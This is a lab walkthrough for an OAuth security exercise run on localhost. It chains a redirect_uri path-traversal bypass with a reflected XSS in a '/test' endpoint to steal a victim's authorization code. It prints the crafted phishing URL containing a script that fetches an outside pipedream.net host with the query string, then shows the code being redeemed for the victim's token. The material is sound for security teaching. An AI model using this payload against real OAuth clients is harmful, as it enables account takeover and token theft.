# Exercise 5
This is an exercise that exploits the directory traversal and xss vulnerability. The goal is to gail access token that tied to victim's account.

## Setup
```
$ git clone https://github.com/melonattacker/oauth-exploit-lab.git
$ cd oauth-exploit-lab/exercise/ex5
$ docker-compose up -d
```
### URL
|  target  |  URL  |
| ---- | ---- |
|  client  |  `http://localhost:10000`  |

### Account
|  username  |  password  |
| ---- | ---- |
|  bob(attacker)  |  hoge  |
|  tom(victim)  |  huga  |

## Writeup
Looking at line 64 of client/app.py, you can see that the redirect_uri check is insufficient. URLs like `http://localhost:10000/callback/../hoge` can bypass the check. This is interpreted as `http://localhost:10000/hoge` in this demo application. 

```:authorization/app.py
    url_parsed: str = urllib.parse.urlparse(request.args.get('redirect_uri'))
    if not (url_parsed.netloc == 'localhost:10000' and url_parsed.path[:9] == '/callback'):
        print('Mismatched redirect URI, expected %s but got %s' % (client['redirect_uris'], request.args.get('redirect_uri')))
        return render_template('error.html', error='Invalid redirect URI')
```

And xss vulnerability exists in client endpoint `/test`.

```
@app.route("/test", methods=["GET"])
def test():
    return f'''
        <p>Hello, {request.args.get('name')}</p>
    '''
```

Redirects to `/test` using directory traversal, and uses xss to send the authorization code included in the query parameters to the attacker's server.

First go through the authorization process and create a URL containing redirect uri. To do that, you can use `exploit/create_url.py`. Please rewrite `attacker_server` to your own server.

```
$ python3 exploit/create_url.py
ri=http%3A%2F%2Flocalhost%3A10000%2Fcallback%2F..%2Ftest%3Fname%3D%3Cscript%3Efetch%28%60https%3A%2F%2Feou3mkkpfovjhx8.m.pipedream.net%3Fsearch%3D%24%7Blocation.search%7D%60%29%3C%2Fscript%3E&state=YJ64AEV8FONKAWSK3ZM1RWMC16J3N6Y8&scope=hoge+huga
```

Then login as tom(victim) and access the fishing URL. Clicking the `Approve` button sends an authorization code to the attacker's server.
<img width="938" alt="スクリーンショット 2022-09-11 11 17 47" src="https://user-images.githubusercontent.com/41631269/189535027-f01834db-9aec-4f37-9af4-a0b2d8e58c69.png">

Log in as bob(attacker) and access the following URL to issue an access token.

```
http://localhost:10000/callback?code=BYJ8QEYE&state=YJ64AEV8FONKAWSK3ZM1RWMC16J3N6Y8
```

Press the `Get Protected Resource` button to see tom's resources.
<img width="1164" alt="スクリーンショット 2022-09-12 0 14 03" src="https://user-images.githubusercontent.com/41631269/189535131-9182a280-be5b-4b2b-ba15-b4ba7d39235c.png">